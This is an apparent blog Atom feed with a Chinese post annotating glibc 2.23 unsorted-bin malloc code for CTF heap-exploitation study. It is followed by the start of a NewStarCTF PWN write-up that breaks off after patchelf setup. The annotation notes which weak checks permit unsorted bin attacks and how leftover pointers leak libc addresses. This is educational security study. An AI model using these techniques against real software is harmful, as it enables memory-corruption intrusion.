<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C_LBY&#39;s BLOG</title>
  
  
  <link href="https://c-lby.github.io/atom.xml" rel="self"/>
  
  <link href="https://c-lby.github.io/"/>
  <updated>2024-03-04T04:36:28.527Z</updated>
  <id>https://c-lby.github.io/</id>
  
  <author>
    <name>鎏柏鱼</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>『glibc源码补完计划』UnsortedBin</title>
    <link href="https://c-lby.github.io/2024/03/02/glibc-unsortedbin/"/>
    <id>https://c-lby.github.io/2024/03/02/glibc-unsortedbin/</id>
    <published>2024-03-02T15:46:40.000Z</published>
    <updated>2024-03-04T04:36:28.527Z</updated>
    
    <content type="html"><![CDATA[<h2 id="UnsortedBin"><a href="#UnsortedBin" class="headerlink" title="UnsortedBin"></a>UnsortedBin</h2><p>最近学习堆题的时候接触到了unsortedbin的利用，感觉还挺有意思的，所以先把它的源码读了，方便以后构建利用思路。之所以这里分析glibc2.23的代码而非2.35的代码，是因为从2.29开始，unsortedbin加入了一坨检查机制以至于它在高版本下难以被攻击，所以索性读低版本的了。</p><p>glibc2.23在unsortedbin中取chunk的时候的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)|| __builtin_expect (victim-&gt;size &gt; av&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>glibc2.29对unsortedbin链表完整性的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">       size = chunksize (victim);</span><br><span class="line">       mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">           || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">           || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">           || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Unsorted-Bin的基本情况-对一些变量的理解"><a href="#Unsorted-Bin的基本情况-对一些变量的理解" class="headerlink" title="Unsorted Bin的基本情况 &amp; 对一些变量的理解"></a>Unsorted Bin的基本情况 &amp; 对一些变量的理解</h3><p>当用户申请一块堆内存的时候，malloc会先去fast bin里找适合的chunk，如果没有则去找small bin，如果还没有这才去找unsorted bin。也就是说如果考虑unsorted bin attack，那就要先考虑到前面两个bin的影响。unsorted bin是一个双向链表，取放的原则是FIFO。最先放入的chunk我们叫尾部，最后放入的叫头部，取出chunk的时候是从尾部取的。</p><p><code>unsorted_chunks(av)</code>: unsorted bin的堆头。unsorted bin一旦被使用，就会初始化这个堆头，它和main_arena在相同glibc版本下有着固定偏移（比如glibc2.23中是main_arena+0x58）。<br><code>av</code>: 一个指向当前arena地址的指针，也就是指向分配区的指针。<br><code>victim</code>: 指当前unsorted bin链表中处于尾部的chunk。<br><code>bck</code>: victim的上一个chunk。<br><code>nb</code>: 用户申请的chunk大小，包括了维护chunk的0x10结构部分。<br><code>remainder</code>: unsorted bin中的chunk被切割后剩下的部分。<br><code>last_remainder</code>: 最后一次被切割的chunk剩下的部分。</p><p>Unsorted Bin由一个循环的双向链表维护，也就是说，链表的头部chunk的bk会指向堆头，而尾部chunk的fd也会指向堆头，如下图所示（chunk0先被释放可看做尾部，chunk1后被释放可看做头部）：</p><p><img src="https://c-lby.github.io/images/glibc_unsortedbin/unsortedbin%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.png" alt="unsortedbin循环链表"></p><p>不难想象，如果unsorted bin中只含有一个chunk，那么这个chunk的fd和bk都会指向堆头，堆头的fd和bk都会指向这个chunk。</p><h3 id="malloc时unsorted-bin的行为"><a href="#malloc时unsorted-bin的行为" class="headerlink" title="malloc时unsorted bin的行为"></a>malloc时unsorted bin的行为</h3><p>接下来我们将源码分段来分析。以下分析顺序基于unsorted bin的行为顺序。</p><h5 id="一些基本检查"><a href="#一些基本检查" class="headerlink" title="一些基本检查"></a>一些基本检查</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*其他的下面再看*/</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>这段代码检查了unsorted bin中是否含有chunk，设置了victim和bck两个变量，并且检查victim的size字段。这个检查相当地简单，所以给予了我们攻击的可能。当然，这种可能在2.29之后概率就很低了。</p><h5 id="对唯一chunk的分割"><a href="#对唯一chunk的分割" class="headerlink" title="对唯一chunk的分割"></a>对唯一chunk的分割</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">          If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">          only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">          runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">          exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">          no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp; <span class="comment">//用户申请的大小在smallbin范围中</span></span><br><span class="line">           bck == unsorted_chunks (av) &amp;&amp; <span class="comment">//unsorted bin中只有唯一chunk</span></span><br><span class="line">           victim == av-&gt;last_remainder &amp;&amp; <span class="comment">//这个chunk是上一次被分割的chunk（包括尚未被分割的chunk）</span></span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) <span class="comment">//这个chunk的size大于用户申请的大小+MINSIZE</span></span><br><span class="line">         &#123;</span><br><span class="line">           <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">           remainder_size = size - nb; <span class="comment">//剩余部分的大小</span></span><br><span class="line">           remainder = chunk_at_offset (victim, nb); <span class="comment">//剩余部分的chunk地址</span></span><br><span class="line">           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; <span class="comment">//修改堆头的fd和bk</span></span><br><span class="line">           av-&gt;last_remainder = remainder; <span class="comment">//更新最后被分割的chunk指针</span></span><br><span class="line">           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); <span class="comment">//修改剩余部分的fd和bk</span></span><br><span class="line">           <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">             &#123;</span><br><span class="line">               remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>)); <span class="comment">//设置取出来的部分的size字段 </span></span><br><span class="line">           set_head (remainder, remainder_size | PREV_INUSE); <span class="comment">//设置剩余部分的size字段</span></span><br><span class="line">           set_foot (remainder, remainder_size); <span class="comment">//设置物理意义上下一个chunk的prev_size</span></span><br><span class="line"></span><br><span class="line">           check_malloced_chunk (av, victim, nb); <span class="comment">//对切割下来的chunk进行检查</span></span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim); <span class="comment">//返回mem指针给用户</span></span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p; </span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>只有满足if条件后malloc才会去切割unsorted bin中的chunk以返回合适的chunk给用户，否则会直接进入下一步。</p><h5 id="移除尾部chunk"><a href="#移除尾部chunk" class="headerlink" title="移除尾部chunk"></a>移除尾部chunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>代码很简单，但是确实把尾部的chunk扔出了unsorted bin。之所以会有这么一步是因为只要上一步切割没实现，那么接下来无论如何尾部chunk都不可能留在unsorted bin里了，要么被分配到其他bin中，要么大小刚刚好而被返回给用户。</p><h5 id="victim返回给用户"><a href="#victim返回给用户" class="headerlink" title="victim返回给用户"></a>victim返回给用户</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果用户申请的chunk大小和victim的大小刚刚好一样，那太好了，直接把victim返回给用户，皆大欢喜。当然，除了会改一改标志位除外，其他地方不会动。也就是说，原本存在上面的fd和bk指针现在依然残留在上面，那就可以利用这一点来泄露libc地址了。</p><h5 id="victim进入到small-bin或large-bin中"><a href="#victim进入到small-bin或large-bin中" class="headerlink" title="victim进入到small bin或large bin中"></a>victim进入到small bin或large bin中</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"> <span class="comment">/*核心的放置步骤在57行*/</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size)) <span class="comment">//如果victim在smallbin范围中（size&lt;0x400）</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size); <span class="comment">//找到对应size的bin的索引</span></span><br><span class="line">              bck = bin_at (av, victim_index); <span class="comment">//将bck设置为对应bin的地址</span></span><br><span class="line">              fwd = bck-&gt;fd; <span class="comment">//将fwd设置为对应bin当前的头部chunk</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="comment">//如果victim在largebin范围中</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size); <span class="comment">//同上</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="comment">/*下面一大坨看起来和复杂但其实它就在干一件事，那就是保持large bin内的chunk要按照size大小从小到大排序*/</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*放置chunk到对应bin的核心步骤，也就是设置fd和bk增加链表节点*/</span></span><br><span class="line">          mark_bin (av, victim_index); <span class="comment">//将victim要进入的bin的binmap设置为1，意味着这个bin里包含空闲chunk</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*然后返回到while处重新找下一个chunk是否能满足用户需求然后返回，除非unsorted bin已经空了，或者已经循环了MAX_ITERS次*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">//这个break是给最初那个while用的，这里也是while语句块的最后一个语句了。</span></span><br></pre></td></tr></table></figure><h5 id="依然找不到合适chunk的解决办法"><a href="#依然找不到合适chunk的解决办法" class="headerlink" title="依然找不到合适chunk的解决办法"></a>依然找不到合适chunk的解决办法</h5><p>如果unsorted bin已经空了或者循环次数过多了，但是还找不到合适的chunk给用户，ptmalloc就开largebin去找大小最合适的chunk，这个chunk大小可能比需要的还要大，所以会把它放进unsorted bin中进行切割。如果还没有，ptmalloc急了就会开地图炮去找合适的chunk来切割。实在没有的话，那就只能去切割top chunk了，或者合并fastbin亦或者直接sysmalloc，此处不做分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">      sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">     &#123;</span><br><span class="line">       bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">       <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">         &#123;</span><br><span class="line">           victim = victim-&gt;bk_nextsize;</span><br><span class="line">           <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                   (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">              list does not have to be rerouted.  */</span></span><br><span class="line">           <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">             victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line">           unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">       <span class="comment">/*至此，最开始的for语句块结束了*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*To be continued...*/</span></span><br></pre></td></tr></table></figure><p>参考阅读：<br>- <a href="https://www.jianshu.com/p/d3fdeff8683f">heap 中常见函数、宏与值</a></p>]]></content>
    
    
    <summary type="html">glibc_2.23，除非特别说明，否则下文默认为此版本下的分析。</summary>
    
    
    
    <category term="glibc源码补完计划" scheme="https://c-lby.github.io/categories/glibc%E6%BA%90%E7%A0%81%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/"/>
    
    
    <category term="CTF" scheme="https://c-lby.github.io/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.github.io/tags/PWN/"/>
    
    <category term="heap" scheme="https://c-lby.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>『NewStarCTF2024』_week4 PWN WP</title>
    <link href="https://c-lby.github.io/2024/03/01/newstar-week4-wp/"/>
    <id>https://c-lby.github.io/2024/03/01/newstar-week4-wp/</id>
    <published>2024-03-01T09:35:50.000Z</published>
    <updated>2024-03-04T04:33:56.642Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言（patchelf的正确打开方式）"><a href="#0x00-前言（patchelf的正确打开方式）" class="headerlink" title="0x00 前言（patchelf的正确打开方式）"></a>0x00 前言（patchelf的正确打开方式）</h3><p>正好最近在学习堆入门，想起来去年还有newstar的题没复现完，所以干脆拿来当堆入门的练手了。但是在做完准备写wp用动调分析的时候遇到了一个问题。我的主力Linux是Ubuntu22，glibc版本是2.35，我学习堆也是从2.35开始往低版本对比学习，如果题目环境glibc不一样（一般都不一样，2.35版本太高了），则需要用patchelf来修改动态链接库以便gdb分析，但是按照网上的流程来patch怎么都不能成功。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6 --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ Double</span></span><br></pre></td></tr></table></figure><p>假如我想用以上命令patch Double这个程序，运行这个程序的时候就会变成这样：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/patchelf%E4%B8%8D%E6%88%90%E5%8A%9F.png" alt="patchelf不成功"></p><p>然后我问了xswlhhh师傅，只要将两个参数分开执行就行，也就是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2 Double</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 Double</span></span><br></pre></td></tr></table></figure><p>这样就能成功patch了。</p><h3 id="0x01-Double"><a href="#0x01-Double" class="headerlink" title="0x01 Double"></a>0x01 Double</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>这是一道经典菜单堆题，题目名字已经明显提示了要用double 